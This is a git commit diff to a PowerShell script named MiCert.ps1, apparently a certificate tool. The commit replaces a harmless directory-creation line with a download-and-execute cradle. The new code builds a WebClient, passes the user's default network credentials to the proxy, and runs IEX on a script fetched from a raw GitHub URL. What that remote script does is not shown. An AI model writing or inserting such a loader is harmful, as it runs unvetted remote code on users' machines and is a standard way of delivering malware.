5830d44a270c59cca6b1bfb310fa8c60a8c588c9
argene-nyc <68665774+argene-nyc@users.noreply.github.com>
2020-08-17 15:39:35 +0700

    Update MiCert.ps1

--- MiCert.ps1
+++ MiCert.ps1
@@ -1,2 +1,4 @@
-New-Item -Path '.\Sds' -ItemType Directory
-exit
+ping cnn.com
+$browser = New-Object System.Net.WebClient
+$browser.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
+IEX($browser.DownloadString("https://raw.githubusercontent.com/argene-nyc/sevilla/master/MiCert.ps1"))
